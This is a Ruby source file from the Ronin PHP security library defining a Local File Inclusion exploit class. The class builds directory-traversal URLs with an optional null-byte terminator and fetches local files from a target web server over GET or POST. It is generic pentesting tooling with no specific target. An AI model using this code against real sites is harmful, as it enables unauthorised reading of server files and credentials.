#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/exploits/web'

require 'ronin/path'

module Ronin
  module Exploits
    class LFI < Web

      #
      # Creates a new Local File Inclusion (LFI) exploit object.
      #
      # @yield []
      #   The given block will be used to create a new LFI exploit object.
      #
      # @return [Ronin::Exploits::PHP::LFI]
      #   The new LFI exploit object.
      #
      # @example
      #   ronin_php_lfi do
      #     cache do
      #       self.name = 'some LFI exploit'
      #       self.description = %{
      #         This is an example LFI exploit.
      #       }
      #     end
      #
      #     def build
      #     end
      #
      #     def deploy
      #     end
      #   end
      #
      contextify :ronin_php_lfi

      # Maximum number of directories to escape
      MAX_UP = 15

      # The path prefix
      property :traverse_prefix, String

      # Number of directories to traverse up
      property :traverse_up, Integer

      # Whether to terminate the LFI path with a null byte
      property :terminate, Boolean

      #
      # Builds a Local File Inclusion (LFI) URL which includes a local path.
      #
      # @param [String] path
      #   The path of the local file to include.
      #
      # @return [URI::HTTP]
      #   The URL for the Local File Inclusion (LFI).
      #
      # @since 0.2.0
      #
      def inclusion_url(path)
        path = path.to_s
        escape = (Path.new(self.traverse_prefix) || Path.up(self.traverse_up))

        full_path = escape.join(path)
        full_path = "#{full_path}\0" if self.terminate?

        url = targeted_url
        url.query_params[self.inclusion_param] = full_path

        return url
      end

      #
      # Includes the contents of a local file.
      #
      # @param [String] path
      #   The path of the local file.
      #
      # @return [String]
      #   The included local file.
      #
      # @since 0.2.0
      #
      def include(path)
        options = {:url => inclusion_url(path)}

        case self.request_method
        when :post, 'post'
          return http_post_body(options)
        else
          return http_get_body(options)
        end
      end

      def vulnerable?
      end

    end
  end
end
